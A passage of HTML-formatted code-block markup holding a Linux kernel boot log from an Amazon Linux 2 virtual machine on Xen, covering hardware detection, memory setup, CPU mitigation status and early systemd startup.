class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br></pre></td><td class="code"><pre><span class="line">[    0.000000] Linux version 4.14.146-120.181.amzn2.x86_64 (mockbuild@ip-10-0-1-243) (gcc version 7.3.1 20180712 (Red Hat 7.3.1-6) (GCC)) #1 SMP Fri Oct 18 17:01:06 UTC 2019</span><br><span class="line">[    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-4.14.146-120.181.amzn2.x86_64 root=UUID=0a5c8d10-5fd5-4c87-8778-4afc3ce97dd9 ro console=tty0 console=ttyS0,115200n8 net.ifnames=0 biosdevname=0 nvme_core.io_timeout=4294967295 rd.emergency=poweroff rd.shell=0</span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x001: &apos;x87 floating point registers&apos;</span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x002: &apos;SSE registers&apos;</span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x004: &apos;AVX registers&apos;</span><br><span class="line">[    0.000000] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256</span><br><span class="line">[    0.000000] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using &apos;standard&apos; format.</span><br><span class="line">[    0.000000] e820: BIOS-provided physical RAM map:</span><br><span class="line">[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009dfff] usable</span><br><span class="line">[    0.000000] BIOS-e820: [mem 0x000000000009e000-0x000000000009ffff] reserved</span><br><span class="line">[    0.000000] BIOS-e820: [mem 0x00000000000e0000-0x00000000000fffff] reserved</span><br><span class="line">[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000003fffffff] usable</span><br><span class="line">[    0.000000] BIOS-e820: [mem 0x00000000fc000000-0x00000000ffffffff] reserved</span><br><span class="line">[    0.000000] NX (Execute Disable) protection: active</span><br><span class="line">[    0.000000] SMBIOS 2.7 present.</span><br><span class="line">[    0.000000] DMI: Xen HVM domU, BIOS 4.2.amazon 08/24/2006</span><br><span class="line">[    0.000000] Hypervisor detected: Xen HVM</span><br><span class="line">[    0.000000] Xen version 4.2.</span><br><span class="line">[    0.000000] Netfront and the Xen platform PCI driver have been compiled for this kernel: unplug emulated NICs.</span><br><span class="line">[    0.000000] Blkfront and the Xen platform PCI driver have been compiled for this kernel: unplug emulated disks.</span><br><span class="line">[    0.000000] You might have to change the root device</span><br><span class="line">[    0.000000] from /dev/hd[a-d] to /dev/xvd[a-d]</span><br><span class="line">[    0.000000] in your root= kernel command line option</span><br><span class="line">[    0.000000] tsc: Fast TSC calibration using PIT</span><br><span class="line">[    0.000000] e820: last_pfn = 0x40000 max_arch_pfn = 0x400000000</span><br><span class="line">[    0.000000] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  </span><br><span class="line">[    0.000000] found SMP MP-table at [mem 0x000fbc50-0x000fbc5f]</span><br><span class="line">[    0.000000] Scanning 1 areas for low memory corruption</span><br><span class="line">[    0.000000] RAMDISK: [mem 0x3442e000-0x3620efff]</span><br><span class="line">[    0.000000] ACPI: Early table checksum verification disabled</span><br><span class="line">[    0.000000] ACPI: RSDP 0x00000000000EA020 000024 (v02 Xen   )</span><br><span class="line">[    0.000000] ACPI: XSDT 0x00000000FC00E2A0 000054 (v01 Xen    HVM      00000000 HVML 00000000)</span><br><span class="line">[    0.000000] ACPI: FACP 0x00000000FC00DF60 0000F4 (v04 Xen    HVM      00000000 HVML 00000000)</span><br><span class="line">[    0.000000] ACPI: DSDT 0x00000000FC0021C0 00BD19 (v02 Xen    HVM      00000000 INTL 20090123)</span><br><span class="line">[    0.000000] ACPI: FACS 0x00000000FC002180 000040</span><br><span class="line">[    0.000000] ACPI: FACS 0x00000000FC002180 000040</span><br><span class="line">[    0.000000] ACPI: APIC 0x00000000FC00E060 0000D8 (v02 Xen    HVM      00000000 HVML 00000000)</span><br><span class="line">[    0.000000] ACPI: HPET 0x00000000FC00E1B0 000038 (v01 Xen    HVM      00000000 HVML 00000000)</span><br><span class="line">[    0.000000] ACPI: WAET 0x00000000FC00E1F0 000028 (v01 Xen    HVM      00000000 HVML 00000000)</span><br><span class="line">[    0.000000] ACPI: SSDT 0x00000000FC00E220 000031 (v02 Xen    HVM      00000000 INTL 20090123)</span><br><span class="line">[    0.000000] ACPI: SSDT 0x00000000FC00E260 000033 (v02 Xen    HVM      00000000 INTL 20090123)</span><br><span class="line">[    0.000000] No NUMA configuration found</span><br><span class="line">[    0.000000] Faking a node at [mem 0x0000000000000000-0x000000003fffffff]</span><br><span class="line">[    0.000000] NODE_DATA(0) allocated [mem 0x3ffde000-0x3fffffff]</span><br><span class="line">[    0.000000] Zone ranges:</span><br><span class="line">[    0.000000]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]</span><br><span class="line">[    0.000000]   DMA32    [mem 0x0000000001000000-0x000000003fffffff]</span><br><span class="line">[    0.000000]   Normal   empty</span><br><span class="line">[    0.000000] Movable zone start for each node</span><br><span class="line">[    0.000000] Early memory node ranges</span><br><span class="line">[    0.000000]   node   0: [mem 0x0000000000001000-0x000000000009dfff]</span><br><span class="line">[    0.000000]   node   0: [mem 0x0000000000100000-0x000000003fffffff]</span><br><span class="line">[    0.000000] Initmem setup node 0 [mem 0x0000000000001000-0x000000003fffffff]</span><br><span class="line">[    0.000000] ACPI: PM-Timer IO Port: 0xb008</span><br><span class="line">[    0.000000] IOAPIC[0]: apic_id 1, version 17, address 0xfec00000, GSI 0-47</span><br><span class="line">[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)</span><br><span class="line">[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 low level)</span><br><span class="line">[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 low level)</span><br><span class="line">[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 low level)</span><br><span class="line">[    0.000000] Using ACPI (MADT) for SMP configuration information</span><br><span class="line">[    0.000000] ACPI: HPET id: 0x8086a201 base: 0xfed00000</span><br><span class="line">[    0.000000] smpboot: Allowing 15 CPUs, 14 hotplug CPUs</span><br><span class="line">[    0.000000] PM: Registered nosave memory: [mem 0x00000000-0x00000fff]</span><br><span class="line">[    0.000000] PM: Registered nosave memory: [mem 0x0009e000-0x0009ffff]</span><br><span class="line">[    0.000000] PM: Registered nosave memory: [mem 0x000a0000-0x000dffff]</span><br><span class="line">[    0.000000] PM: Registered nosave memory: [mem 0x000e0000-0x000fffff]</span><br><span class="line">[    0.000000] e820: [mem 0x40000000-0xfbffffff] available for PCI devices</span><br><span class="line">[    0.000000] Booting paravirtualized kernel on Xen HVM</span><br><span class="line">[    0.000000] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645519600211568 ns</span><br><span class="line">[    0.000000] random: get_random_bytes called from start_kernel+0x94/0x4c8 with crng_init=0</span><br><span class="line">[    0.000000] setup_percpu: NR_CPUS:8192 nr_cpumask_bits:15 nr_cpu_ids:15 nr_node_ids:1</span><br><span class="line">[    0.000000] percpu: Embedded 44 pages/cpu s140504 r8192 d31528 u262144</span><br><span class="line">[    0.000000] PV qspinlock hash table entries: 256 (order: 0, 4096 bytes)</span><br><span class="line">[    0.000000] Built 1 zonelists, mobility grouping on.  Total pages: 257928</span><br><span class="line">[    0.000000] Policy zone: DMA32</span><br><span class="line">[    0.000000] Kernel command line: BOOT_IMAGE=/boot/vmlinuz-4.14.146-120.181.amzn2.x86_64 root=UUID=0a5c8d10-5fd5-4c87-8778-4afc3ce97dd9 ro console=tty0 console=ttyS0,115200n8 net.ifnames=0 biosdevname=0 nvme_core.io_timeout=4294967295 rd.emergency=poweroff rd.shell=0</span><br><span class="line">[    0.000000] PID hash table entries: 4096 (order: 3, 32768 bytes)</span><br><span class="line">[    0.000000] Memory: 971264K/1048180K available (10252K kernel code, 1956K rwdata, 2764K rodata, 2084K init, 3924K bss, 76916K reserved, 0K cma-reserved)</span><br><span class="line">[    0.000000] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=15, Nodes=1</span><br><span class="line">[    0.000000] Kernel/User page tables isolation: enabled</span><br><span class="line">[    0.000000] ftrace: allocating 26556 entries in 104 pages</span><br><span class="line">[    0.004000] Hierarchical RCU implementation.</span><br><span class="line">[    0.004000] RCU restricting CPUs from NR_CPUS=8192 to nr_cpu_ids=15.</span><br><span class="line">[    0.004000] RCU: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=15</span><br><span class="line">[    0.004000] NR_IRQS: 524544, nr_irqs: 952, preallocated irqs: 16</span><br><span class="line">[    0.004000] xen:events: Using 2-level ABI</span><br><span class="line">[    0.004000] xen:events: Xen HVM callback vector for event delivery is enabled</span><br><span class="line">[    0.004000] Console: colour VGA+ 80x25</span><br><span class="line">[    0.004000] console [tty0] enabled</span><br><span class="line">[    0.004000] Cannot get hvm parameter CONSOLE_EVTCHN (18): -22!</span><br><span class="line">[    0.004000] console [ttyS0] enabled</span><br><span class="line">[    0.004000] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 30580167144 ns</span><br><span class="line">[    0.008000] tsc: Fast TSC calibration using PIT</span><br><span class="line">[    0.024004] tsc: Detected 2399.992 MHz processor</span><br><span class="line">[    0.028009] Calibrating delay loop (skipped), value calculated using timer frequency.. 4800.06 BogoMIPS (lpj=9600128)</span><br><span class="line">[    0.036006] pid_max: default: 32768 minimum: 301</span><br><span class="line">[    0.040022] ACPI: Core revision 20170728</span><br><span class="line">[    0.048484] ACPI: 3 ACPI AML tables successfully acquired and loaded</span><br><span class="line">[    0.052032] Security Framework initialized</span><br><span class="line">[    0.056009] SELinux:  Initializing.</span><br><span class="line">[    0.060200] Dentry cache hash table entries: 131072 (order: 8, 1048576 bytes)</span><br><span class="line">[    0.064088] Inode-cache hash table entries: 65536 (order: 7, 524288 bytes)</span><br><span class="line">[    0.080026] Mount-cache hash table entries: 2048 (order: 2, 16384 bytes)</span><br><span class="line">[    0.084009] Mountpoint-cache hash table entries: 2048 (order: 2, 16384 bytes)</span><br><span class="line">[    0.092248] mce: CPU supports 2 MCE banks</span><br><span class="line">[    0.096029] Last level iTLB entries: 4KB 1024, 2MB 1024, 4MB 1024</span><br><span class="line">[    0.100005] Last level dTLB entries: 4KB 1024, 2MB 1024, 4MB 1024, 1GB 4</span><br><span class="line">[    0.108004] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">[    0.116004] Spectre V2 : Mitigation: Full generic retpoline</span><br><span class="line">[    0.120002] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch</span><br><span class="line">[    0.128004] Speculative Store Bypass: Vulnerable</span><br><span class="line">[    0.132029] MDS: Vulnerable: Clear CPU buffers attempted, no microcode</span><br><span class="line">[    0.145583] smpboot: Max logical packages: 15</span><br><span class="line">[    0.148775] x2apic: IRQ remapping doesn&apos;t support X2APIC mode</span><br><span class="line">[    0.152006] Switched APIC routing to physical flat.</span><br><span class="line">[    0.162551] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=0 pin2=0</span><br><span class="line">[    0.207295] clocksource: xen: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns</span><br><span class="line">[    0.216018] installing Xen timer for CPU 0</span><br><span class="line">[    0.224085] smpboot: CPU0: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz (family: 0x6, model: 0x3f, stepping: 0x2)</span><br><span class="line">[    0.228037] cpu 0 spinlock event irq 53</span><br><span class="line">[    0.231750] Performance Events: unsupported p6 CPU model 63 no PMU driver, software events only.</span><br><span class="line">[    0.232060] Hierarchical SRCU implementation.</span><br><span class="line">[    0.236243] NMI watchdog: Perf event create on CPU 0 failed with -2</span><br><span class="line">[    0.240008] NMI watchdog: Perf NMI watchdog permanently disabled</span><br><span class="line">[    0.244213] smp: Bringing up secondary CPUs ...</span><br><span class="line">[    0.248007] smp: Brought up 1 node, 1 CPU</span><br><span class="line">[    0.252008] smpboot: Total of 1 processors activated (4800.06 BogoMIPS)</span><br><span class="line">[    0.256471] devtmpfs: initialized</span><br><span class="line">[    0.260050] x86/mm: Memory block size: 128MB</span><br><span class="line">[    0.264237] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns</span><br><span class="line">[    0.268021] futex hash table entries: 4096 (order: 6, 262144 bytes)</span><br><span class="line">[    0.272259] NET: Registered protocol family 16</span><br><span class="line">[    0.276269] cpuidle: using governor ladder</span><br><span class="line">[    0.280008] cpuidle: using governor menu</span><br><span class="line">[    0.284064] ACPI: bus type PCI registered</span><br><span class="line">[    0.288006] acpiphp: ACPI Hot Plug PCI Controller Driver version: 0.5</span><br><span class="line">[    0.292579] PCI: Using configuration type 1 for base access</span><br><span class="line">[    0.299224] HugeTLB registered 2.00 MiB page size, pre-allocated 0 pages</span><br><span class="line">[    0.300281] ACPI: Added _OSI(Module Device)</span><br><span class="line">[    0.304015] ACPI: Added _OSI(Processor Device)</span><br><span class="line">[    0.308008] ACPI: Added _OSI(3.0 _SCP Extensions)</span><br><span class="line">[    0.312008] ACPI: Added _OSI(Processor Aggregator Device)</span><br><span class="line">[    0.319174] ACPI: Interpreter enabled</span><br><span class="line">[    0.320022] ACPI: (supports S0 S4 S5)</span><br><span class="line">[    0.323782] ACPI: Using IOAPIC for interrupt routing</span><br><span class="line">[    0.324053] PCI: Using host bridge windows from ACPI; if necessary, use &quot;pci=nocrs&quot; and report a bug</span><br><span class="line">[    0.328506] ACPI: Enabled 2 GPEs in block 00 to 0F</span><br><span class="line">[    0.392237] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])</span><br><span class="line">[    0.396022] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI]</span><br><span class="line">[    0.400032] acpi PNP0A03:00: _OSC failed (AE_NOT_FOUND); disabling ASPM</span><br><span class="line">[    0.404028] acpi PNP0A03:00: fail to add MMCONFIG information, can&apos;t access extended PCI configuration space under this bridge.</span><br><span class="line">[    0.409269] acpiphp: Slot [0] registered</span><br><span class="line">[    0.413608] acpiphp: Slot [3] registered</span><br><span class="line">[    0.416549] acpiphp: Slot [4] registered</span><br><span class="line">[    0.420512] acpiphp: Slot [5] registered</span><br><span class="line">[    0.424617] acpiphp: Slot [6] registered</span><br><span class="line">[    0.428585] acpiphp: Slot [7] registered</span><br><span class="line">[    0.432470] acpiphp: Slot [8] registered</span><br><span class="line">[    0.436475] acpiphp: Slot [9] registered</span><br><span class="line">[    0.440645] acpiphp: Slot [10] registered</span><br><span class="line">[    0.444488] acpiphp: Slot [11] registered</span><br><span class="line">[    0.448440] acpiphp: Slot [12] registered</span><br><span class="line">[    0.452750] acpiphp: Slot [13] registered</span><br><span class="line">[    0.456479] acpiphp: Slot [14] registered</span><br><span class="line">[    0.460658] acpiphp: Slot [15] registered</span><br><span class="line">[    0.464563] acpiphp: Slot [16] registered</span><br><span class="line">[    0.468527] acpiphp: Slot [17] registered</span><br><span class="line">[    0.472699] acpiphp: Slot [18] registered</span><br><span class="line">[    0.476535] acpiphp: Slot [19] registered</span><br><span class="line">[    0.480590] acpiphp: Slot [20] registered</span><br><span class="line">[    0.484559] acpiphp: Slot [21] registered</span><br><span class="line">[    0.488634] acpiphp: Slot [22] registered</span><br><span class="line">[    0.492585] acpiphp: Slot [23] registered</span><br><span class="line">[    0.496617] acpiphp: Slot [24] registered</span><br><span class="line">[    0.500665] acpiphp: Slot [25] registered</span><br><span class="line">[    0.504609] acpiphp: Slot [26] registered</span><br><span class="line">[    0.508604] acpiphp: Slot [27] registered</span><br><span class="line">[    0.512593] acpiphp: Slot [28] registered</span><br><span class="line">[    0.516610] acpiphp: Slot [29] registered</span><br><span class="line">[    0.520769] acpiphp: Slot [30] registered</span><br><span class="line">[    0.524763] acpiphp: Slot [31] registered</span><br><span class="line">[    0.528510] PCI host bridge to bus 0000:00</span><br><span class="line">[    0.532013] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]</span><br><span class="line">[    0.536008] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]</span><br><span class="line">[    0.540012] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]</span><br><span class="line">[    0.544011] pci_bus 0000:00: root bus resource [mem 0xf0000000-0xfbffffff window]</span><br><span class="line">[    0.548008] pci_bus 0000:00: root bus resource [bus 00-ff]</span><br><span class="line">[    0.563133] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]</span><br><span class="line">[    0.564011] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]</span><br><span class="line">[    0.568011] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]</span><br><span class="line">[    0.572009] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]</span><br><span class="line">[    0.577068] * Found PM-Timer Bug on the chipset. Due to workarounds for a bug,</span><br><span class="line">[    0.577068] * this clock source is slow. Consider trying other clock sources</span><br><span class="line">[    0.582449] pci 0000:00:01.3: quirk: [io  0xb000-0xb03f] claimed by PIIX4 ACPI</span><br><span class="line">[    0.595144] ACPI: PCI Interrupt Link [LNKA] (IRQs *5 10 11)</span><br><span class="line">[    0.596292] ACPI: PCI Interrupt Link [LNKB] (IRQs 5 *10 11)</span><br><span class="line">[    0.600321] ACPI: PCI Interrupt Link [LNKC] (IRQs 5 10 *11)</span><br><span class="line">[    0.604290] ACPI: PCI Interrupt Link [LNKD] (IRQs *5 10 11)</span><br><span class="line">[    0.633199] xen:balloon: Initialising balloon driver</span><br><span class="line">[    0.644177] pci 0000:00:02.0: vgaarb: setting as boot VGA device</span><br><span class="line">[    0.648000] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none</span><br><span class="line">[    0.648029] pci 0000:00:02.0: vgaarb: bridge control possible</span><br><span class="line">[    0.652006] vgaarb: loaded</span><br><span class="line">[    0.655639] EDAC MC: Ver: 3.0.0</span><br><span class="line">[    0.656842] PCI: Using ACPI for IRQ routing</span><br><span class="line">[    0.660747] NetLabel: Initializing</span><br><span class="line">[    0.664011] NetLabel:  domain hash size = 128</span><br><span class="line">[    0.667875] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO</span><br><span class="line">[    0.668026] NetLabel:  unlabeled traffic allowed by default</span><br><span class="line">[    0.672276] HPET: 3 timers in total, 0 timers will be used for per-cpu timer</span><br><span class="line">[    0.676029] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0</span><br><span class="line">[    0.680013] hpet0: 3 comparators, 64-bit 62.500000 MHz counter</span><br><span class="line">[    0.686136] clocksource: Switched to clocksource xen</span><br><span class="line">[    0.696694] VFS: Disk quotas dquot_6.6.0</span><br><span class="line">[    0.700953] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)</span><br><span class="line">[    0.707397] pnp: PnP ACPI init</span><br><span class="line">[    0.715950] system 00:00: [mem 0x00000000-0x0009ffff] could not be reserved</span><br><span class="line">[    0.722553] system 00:01: [io  0x08a0-0x08a3] has been reserved</span><br><span class="line">[    0.727607] system 00:01: [io  0x0cc0-0x0ccf] has been reserved</span><br><span class="line">[    0.732911] system 00:01: [io  0x04d0-0x04d1] has been reserved</span><br><span class="line">[    0.738812] system 00:07: [io  0x10c0-0x1141] has been reserved</span><br><span class="line">[    0.744676] system 00:07: [io  0xb044-0xb047] has been reserved</span><br><span class="line">[    0.774604] pnp: PnP ACPI: found 8 devices</span><br><span class="line">[    0.778540] random: fast init done</span><br><span class="line">[    0.788760] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns</span><br><span class="line">[    0.796873] NET: Registered protocol family 2</span><br><span class="line">[    0.808201] TCP established hash table entries: 8192 (order: 4, 65536 bytes)</span><br><span class="line">[    0.814540] TCP bind hash table entries: 8192 (order: 5, 131072 bytes)</span><br><span class="line">[    0.821525] TCP: Hash tables configured (established 8192 bind 8192)</span><br><span class="line">[    0.827460] UDP hash table entries: 512 (order: 2, 16384 bytes)</span><br><span class="line">[    0.832896] UDP-Lite hash table entries: 512 (order: 2, 16384 bytes)</span><br><span class="line">[    0.838546] NET: Registered protocol family 1</span><br><span class="line">[    0.842668] pci 0000:00:00.0: Limiting direct PCI/PCI transfers</span><br><span class="line">[    0.848363] pci 0000:00:01.0: PIIX3: Enabling Passive Release</span><br><span class="line">[    0.853616] pci 0000:00:01.0: Activating ISA DMA hang workarounds</span><br><span class="line">[    0.859531] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]</span><br><span class="line">[    0.867703] Unpacking initramfs...</span><br><span class="line">[    0.947346] Freeing initrd memory: 30596K</span><br><span class="line">[    0.951902] Scanning for low memory corruption every 60 seconds</span><br><span class="line">[    0.962945] audit: initializing netlink subsys (disabled)</span><br><span class="line">[    0.968085] Initialise system trusted keyrings</span><br><span class="line">[    0.972699] Key type blacklist registered</span><br><span class="line">[    0.977000] audit: type=2000 audit(1573718998.226:1): state=initialized audit_enabled=0 res=1</span><br><span class="line">[    0.985302] workingset: timestamp_bits=36 max_order=18 bucket_order=0</span><br><span class="line">[    0.992262] zbud: loaded</span><br><span class="line">[    1.161369] Key type asymmetric registered</span><br><span class="line">[    1.167563] Asymmetric key parser &apos;x509&apos; registered</span><br><span class="line">[    1.172109] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)</span><br><span class="line">[    1.179241] io scheduler noop registered (default)</span><br><span class="line">[    1.183614] io scheduler cfq registered</span><br><span class="line">[    1.187568] crc32: CRC_LE_BITS = 64, CRC_BE BITS = 64</span><br><span class="line">[    1.192177] crc32: self tests passed, processed 225944 bytes in 162812 nsec</span><br><span class="line">[    1.200974] crc32c: CRC_LE_BITS = 64</span><br><span class="line">[    1.205404] crc32c: self tests passed, processed 225944 bytes in 81046 nsec</span><br><span class="line">[    1.226844] crc32_combine: 8373 self tests passed</span><br><span class="line">[    1.246791] crc32c_combine: 8373 self tests passed</span><br><span class="line">[    1.253272] xen:grant_table: Grant tables using version 1 layout</span><br><span class="line">[    1.260474] Grant table initialized</span><br><span class="line">[    1.265109] Cannot get hvm parameter CONSOLE_EVTCHN (18): -22!</span><br><span class="line">[    1.271788] Serial: 8250/16550 driver, 4 ports, IRQ sharing disabled</span><br><span class="line">[    1.317085] 00:06: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A</span><br><span class="line">[    1.328869] xen_netfront: Initialising Xen virtual ethernet driver</span><br><span class="line">[    1.342601] i8042: PNP: PS/2 Controller [PNP0303:PS2K,PNP0f13:PS2M] at 0x60,0x64 irq 1,12</span><br><span class="line">[    1.354532] serio: i8042 KBD port at 0x60,0x64 irq 1</span><br><span class="line">[    1.359648] serio: i8042 AUX port at 0x60,0x64 irq 12</span><br><span class="line">[    1.366331] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input0</span><br><span class="line">[    1.375854] rtc_cmos 00:02: rtc core: registered rtc_cmos as rtc0</span><br><span class="line">[    1.382863] rtc_cmos 00:02: alarms up to one day, 114 bytes nvram, hpet irqs</span><br><span class="line">[    1.390281] hidraw: raw HID events driver (C) Jiri Kosina</span><br><span class="line">[    1.396556] NET: Registered protocol family 17</span><br><span class="line">[    1.402307] sched_clock: Marking stable (1401935491, 0)-&gt;(2454683182, -1052747691)</span><br><span class="line">[    1.411635] registered taskstats version 1</span><br><span class="line">[    1.416047] Loading compiled-in X.509 certificates</span><br><span class="line">[    1.423184] Loaded X.509 cert &apos;Build time autogenerated kernel key: 6299c6d6e1a24aa79e34ed5acce2ba03c8deb4ff&apos;</span><br><span class="line">[    1.432288] zswap: loaded using pool lzo/zbud</span><br><span class="line">[    1.437475] ima: No TPM chip found, activating TPM-bypass! (rc=-19)</span><br><span class="line">[    1.444989] ima: Allocated hash algorithm: sha1</span><br><span class="line">[    1.552123] xenbus_probe_frontend: Device with no driver: device/vbd/51712</span><br><span class="line">[    1.559071] xenbus_probe_frontend: Device with no driver: device/vbd/51792</span><br><span class="line">[    1.567078] rtc_cmos 00:02: setting system clock to 2019-11-14 08:09:59 UTC (1573718999)</span><br><span class="line">[    1.581280] Freeing unused kernel memory: 2084K</span><br><span class="line">[    1.592094] Write protecting the kernel read-only data: 16384k</span><br><span class="line">[    1.598397] Freeing unused kernel memory: 2016K</span><br><span class="line">[    1.607024] Freeing unused kernel memory: 1332K</span><br><span class="line">[    1.651713] systemd[1]: Inserted module &apos;autofs4&apos;</span><br><span class="line">[    1.669143] NET: Registered protocol family 10</span><br><span class="line">[    1.676087] Segment Routing with IPv6</span><br><span class="line">[    1.680505] systemd[1]: Inserted module &apos;ipv6&apos;</span><br><span class="line">[    1.687065] random: systemd: uninitialized urandom read (16 bytes read)</span><br><span class="line">[    1.696111] random: systemd: uninitialized urandom read (16 bytes read)</span><br><span class="line">[    1.702360] random: systemd: uninitialized urandom read (16 bytes read)</span><br><span class="line">[    1.710275] systemd[1]: systemd 219 running in system mode. (+PAM +AUDIT +SELINUX +IMA -APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 -SECCOMP +BLKID +ELFUTILS +KMOD +IDN)</span><br><span class="line">[    1.744832] systemd[1]: Detected virtualization xen.</span><br><span class="line">[    1.749375] systemd[1]: Detected architecture x86-64.</span><br><span class="line">[    1.753604] systemd[1]: Running in initial RAM disk.</span><br><span class="line"></span><br><span class="line">Welcome to [0;34mAmazon Linux 2 dracut-033-535.amzn2.1.3 (Initramfs)[0m!</span><br><span class="line"></span><br><span class="line">[    1.763333] systemd[1]: No hostname configured.</span><br><span class="line">[    1.770334] systemd[1]: Set hostname to &lt;localhost&gt;.</span><br><span class="line">[    1.777607] systemd[1]: Initializing machine ID from random generator.</span><br><span class="line">[[32m  OK  [0m] Reached target Local File Systems.</span><br><span class="line">[    1.816024] systemd[1]: Reached target Local File Systems.</span><br><span class="line">[    1.821089] systemd[1]: Starting Local File Systems.</span><br><span class="line">[[32m  OK  [0m] Reached target Timers.</span><br><span class="line">[    1.829223] systemd[1]: Reached target Timers.</span><br><span class="line">[[32m  OK  [0m] Reached target Swap.</span><br><span class="line">[[32m  OK  [0m] Reached target Local Encrypted Volumes.</span><br><span class="line">[[32m  OK  [0m] Created slice Root Slice.</span><br><span class="line">[[32m  OK  [0m] Listening on udev Control Socket.</span><br><span class="line">[[32m  OK  [0m] Listening on udev Kernel Socket.</span><br><span class="line">[[32m  OK  [0m] Created slice System Slice.</span><br><span class="line">[[32m  OK  [0m] Reached target Slices.</span><br><span class="line">[[32m  OK  [0m] Listening on Journal Socket.</span><br><span class="line">         Starting Setup Virtual Console...</span><br><span class="line">         Starting Create list of required st... nodes for the current kernel...</span><br><span 